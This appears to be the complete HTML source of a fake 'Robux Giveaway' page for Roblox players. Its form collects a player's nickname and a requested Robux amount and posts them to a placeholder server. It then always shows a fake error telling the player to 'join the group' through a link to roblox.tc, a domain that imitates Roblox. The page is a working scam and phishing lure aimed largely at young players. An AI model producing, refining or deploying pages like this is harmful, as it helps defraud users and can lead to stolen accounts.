<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üéÅ Robux Giveaway</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://i.ibb.co/mCzdVJYp/natal-fundo.jpg') no-repeat center center fixed;
      background-size: cover;
      backdrop-filter: blur(4px);
      color: white;
      overflow: hidden;
    }

    .fog {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://i.imgur.com/8fKQZ5P.png') repeat;
      opacity: 0.2;
      pointer-events: none;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      max-width: 400px;
      margin: 100px auto;
      background: rgba(0, 0, 0, 0.75);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #ff4444;
      text-align: center;
    }

    h1 {
      margin-bottom: 20px;
      color: #ff4444;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #ff4444;
      color: white;
      font-weight: bold;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    .popup {
      display: none;
      margin-top: 20px;
      background: #111;
      padding: 20px;
      border-radius: 10px;
      border-left: 4px solid red;
    }

    .popup p {
      margin: 10px 0;
      color: #ff4444;
    }

    .popup a {
      display: inline-block;
      background-color: #007bff;
      color: white;
      padding: 10px 15px;
      border-radius: 8px;
      text-decoration: none;
      margin-top: 10px;
    }

    .popup a:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="fog"></div>
  <div class="container">
    <h1>üéÑ Robux Giveaway</h1>
    <form id="robuxForm">
      <input type="text" id="nick" placeholder="Seu Nick do Roblox" required />
      <input type="number" id="robux" placeholder="Quantidade de Robux" required />
      <button type="submit">Enviar</button>
    </form>
    <div class="popup" id="errorPopup">
      <p>‚ùå ERROR: YOU NEED TO JOIN THE GROUP FOR THE ROBUX TO BE SENT TO YOU </p>
      <p>üí∏ JOIN THE GROUP TO GET YOUR ROBUX HERE üëá</p>
      <a href="https://www.roblox.tc/communities/1671585164/RobuxGiveaway" target="_blank">JOIN THE GROUP</a>
    </div>
  </div>

  <script>
    const form = document.getElementById("robuxForm");
    const popup = document.getElementById("errorPopup");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      popup.style.display = "block";

      const nick = document.getElementById("nick").value;
      const robux = document.getElementById("robux").value;

   fetch("https://seuservidor.com/api/enviar", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ nick, robux })
      }).then(res => console.log("Dados enviados"))
        .catch(err => console.error("Erro:", err));
    });
  </script>
</body>
</html>
